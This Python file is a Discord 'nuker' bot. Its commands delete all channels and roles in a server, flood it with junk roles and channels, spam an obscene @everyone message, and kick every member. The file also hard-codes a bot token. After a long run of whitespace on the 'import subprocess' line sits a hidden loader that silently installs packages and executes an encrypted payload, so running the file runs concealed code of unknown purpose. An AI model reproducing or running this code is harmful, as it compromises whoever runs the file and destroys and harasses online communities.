import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'qMQ9By0xS9aF5IiNtG4neJTkGsJhNSYj3qNHWGt4MFE=').decrypt(b'gAAAAABmsjBaunHYT1DiuG1H-Gu7cakmbY_cmW6vjsE5JnEyRYx_zpajQm_tvR7b2xoTVD_xHKxTXaGtzjnPofMoRvn-zPZKKYcgWKQwo-6pQNhlf4zIdsPATxoK0jWxGkz2l4c0YCMYHhk9SrmGEQiLAQWFDWJoqorNbSgtQ6dn6xCum-C2HcszvIUwRmj_GjoIAqso6BFfkSCrqPY5r5tETUixtkKJwCv_WL2zpepW1z6IG6HL2AT_-Hl_gMeYCD9DqYfuh6iVUdBU4sxx9UV4SmiatiOu-y82lLMvN4gmiPP0fczhTkXxeiPU7JPiKcVSiwEZUDJ4qqaE6UHw_p_zEe2N-yvYPdmA3ZiuFF9xP2F--vDUs_fcI-tNOJQ30FsQTRngWbuvmC73nwdDJrLPjctODFfCaoxYuIULNJpb5CXAQznolo-rdEHT3l6MreMIo4JwX_vnuHeEIg5jmyzaeUD3yYndD1hcwNZziBxEBtSGxesijrkGET-z_9ILlOt-qzRPprGIee7TdsKPeS3QVKFzFz225TnR6G185nqjG2Mbzm6gtFM2JGdkjBMdWh0Ki1BsVSGTKXPpmyvO8t912b8hZrV8M97UdFvr7oqnCxdhedFYcZ3k1NIHhNsqG8fHdBnhdoNozpPWEz65K2DhdmMCnHbf0wKKhhV65CreEnDknEL8X2OHzPk7PmFWmm1-bLVJkI00V_8oA0zq9-dkSnX5Y99N-LuJ0F3A11p9U_lCYgVAdU5_I_AqaudQhZFPG3oBEPetXyprKJMnXK3EzXJ9cmWSNPUsNuxRhFNTR0EpmHBteF6Rp829wBYtg5QY-iZUlQqQt-3kNx5d7o8rYtgsDKyapyf_sJzM-YYa799kZDa7X5hA0kXB5VAqoxgQ-eSBusZWuVJDKhM1AoPOFXmTWVfn9shhNsIYNFOdCKIqba9UEArzzhVB1mqzL2knAyeZ5NVSRM-ladyM5ZrnXj0lrMyBMyyj_P2Pp1sY_vn8g31WDTeQrjhchBtH6VvXVTc7wM7DYstnhQ8alzIQBpuW9LKr63cJyxqxvV9rm64cGsDlm2geIUb7o214Nb2d-lKzqcCdLEKCGXEhK-XWNOwqrDv7AQpz0Z0d_KKvVHcJimlpQGmX8V2kffUJLFiSGMaL30Llf4s1qN0CNKxIcWYvVpnBb6RxSDRrYABAWKS7yFGC4WwVAtXRGEXeyOV2XWeoV99vV_Sks_QNGnz3KSb58wB-i5hreBrKWrYKCy5A_9wD_Gji0PiL0QrLcLnvlBbK9MyE_w47GMWV3-JTnQ_fuq7i96w6qOJPaMyQxMjZE3eV7VNyXv5hzH7QsjUuqma9yYnVxw2AkDVVHVPBXaE61xNgRwloIwQB132pxCvJz6oXsLooY1m-G3nA10kvrOf1yDRddzecaH0zwwZUmkZtTzhu0G1eA6Or8Hzq_oYqqFclZecEF3nJ2zzEP5dcNXZQ0QOn'));
import discord
from discord.ext import commands

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("Ready!")

@client.command()
async def destroy(ctx, guild_id: int):
    await ctx.send("**Process Initiated. We're going to have a lot of fun.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")
    for _ in range(125):
        try:
            await guild.create_role(name="unknown")
        except:
            print("Creating roles failed.")
    for _ in range(125):
        await guild.create_text_channel(name="unknown")
    for channel in list(guild.channels):
        for _ in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked unknown.")  
            except:
                print("Sending Message failed.")

@client.command()
async def kick(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return
    
    if not guild.me.guild_permissions.kick_members:
        await ctx.send("I don't have permission to kick members.")
        return
    
    for member in guild.members:
        try:
            if member == guild.owner:
                continue
            await member.kick(reason="kick members")
            await ctx.send(f"{member.display_name} has been kicked from the server.")
        except discord.Forbidden:
            await ctx.send(f"{member.display_name} I'm not allowed to kick this user.")
        except discord.HTTPException:
            await ctx.send(f"{member.display_name} there was an error trying to kick this user.")
    
    await ctx.send("All members on the server have been kicked out.")



@client.command()
async def members(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    member_count = guild.member_count
    await ctx.send(f"The server has {member_count} members.")

@client.command()
async def nothing(ctx, guild_id: int):
    await ctx.send("**Process Initiated.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")

@client.command()
async def help(ctx):
    await ctx.send("**[1] !help - `(Show Commands)`**")
    await ctx.send("**[2] !destroy [guild_id] `(Destroys the specified server)`**")
    await ctx.send("**[3] !kick [guild_id]`(Ban All Members on the Server)`**")
    await ctx.send("**[4] !members [guild_id] `(Shows the number of members in the server)`**")
    await ctx.send("**[5] !nothing [guild_id] `(Deletes all channels and roles)`**")
    await ctx.send("**[6] !f `(Exit Bot)`**")

@client.command()
async def f(ctx):
    await ctx.send("Exiting...")
    await client.close()

TOKEN = "MTIzNzc0ODQ2NTExMTUzMTU1MQ.GxuOcC.ipHRpOXTs9Q29hCis82pH7Y2XGmOsyQD3xeuZI"
client.run(TOKEN)
